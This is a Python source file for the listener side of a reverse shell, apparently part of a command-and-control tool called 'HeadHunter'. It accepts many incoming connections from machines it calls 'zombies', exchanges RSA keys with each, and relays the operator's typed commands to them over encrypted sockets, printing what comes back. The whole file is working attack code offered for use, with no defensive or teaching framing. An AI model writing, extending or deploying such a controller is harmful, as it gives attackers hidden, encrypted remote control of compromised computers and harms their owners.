import socket
import threading
import sys 
import time
import rsa

# Generate public and private RSA keys for the server
public_key, private_key = rsa.newkeys(2048)
public_partner = [None for i in range(100)]

def acceptor(c, addr, s):
		
	i = 1
	while True:
		c[i], addr[i] = s.accept()
		c[i].send(public_key.save_pkcs1("PEM"))
		public_partner[i] = rsa.PublicKey.load_pkcs1(c[i].recv(2048))
		print("\ngot connection from " + str(addr[i]) + " starting session. Type any command or press enter to return to previous session\n")
		i+=1
		

def listen(host, port):
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(100)

	print("\nListening on port " + str(port) + " for connections")
	
	global c
	global addr	
	c = [None for i in range(100)]
	addr = [None for i in range(100)]

	c[0], addr[0] = s.accept()
	c[0].send(public_key.save_pkcs1("PEM"))
	public_partner[0] = rsa.PublicKey.load_pkcs1(c[0].recv(2048))

		
	
	print("got connection from " + str(addr[0]) + ". Starting reverse shell session. Type \"exit\" to return to the HeadHunter interactive shell\n")

	thread = threading.Thread(target=acceptor, args=(c, addr, s), daemon=True)
	thread.start()
	global activefd
	global activeaddr
	activefd = c[0]
	activeaddr = addr[0]
	zombiepubkey = public_partner[0]
	control(activefd, zombiepubkey)
	


def control(zombie, zombiepubkey):

	try:
		while True:	
			prompt = rsa.decrypt(zombie.recv(5024), private_key).decode()	
			sys.stdout.write(prompt)

			d = input()

			if(d == "exit"):
				break;

			d += "\n"
			zombie.send(rsa.encrypt(d.encode(), zombiepubkey))
			
			cmd = rsa.decrypt(zombie.recv(5024), private_key).decode()
			sys.stdout.write(cmd)
			
	except Exception as e:
		print("Error: " + str(e))
